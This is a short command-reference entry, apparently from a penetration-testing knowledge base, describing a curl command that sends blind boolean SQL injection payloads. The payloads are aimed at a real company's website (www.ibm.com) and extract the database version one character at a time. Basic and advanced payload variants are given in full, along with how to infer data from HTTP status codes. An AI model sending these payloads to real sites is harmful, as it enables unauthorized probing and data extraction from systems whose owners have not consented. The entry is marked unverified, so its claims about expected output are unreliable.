---
data: >-
  curl -i -L --max-redirs 1
  "https://www.ibm.com/'AND(ASCII(SUBSTRING((SELECT@@version),1,1))>64)--"
tags:
  - sqli
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.318Z'
id: 3c0b71fc-ca42-4106-9302-7722067cfcf1
verified: false
validated: true
submitted: true
---
# curl-send-conditional-payload

## Command

```bash
curl -i -L --max-redirs 1 "https://www.ibm.com/'AND(ASCII(SUBSTRING((SELECT@@version),1,1))>64)--"
```

## Description

Executes a conditional SQL payload via curl to test boolean outcomes in blind SQLi, limiting redirects to detect loops.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include headers | Yes |
| `-L` | Follow redirects | Yes |
| `--max-redirs 1` | Limit redirect follows | Yes |
| URL | Payload-encoded URL | Yes |

## Examples

### Basic Usage

```bash
curl -i -L --max-redirs 1 "https://www.ibm.com/'AND1=1--"
```

### Advanced Usage

```bash
curl -i -L --max-redirs 1 "https://www.ibm.com/'AND(ASCII(SUBSTRING((SELECT@@version),2,1))<122)--"
```

## Expected Output

Redirect (302) for true conditions or 500 error for false, allowing inference of data.

## Related

- [[Related Procedure]]
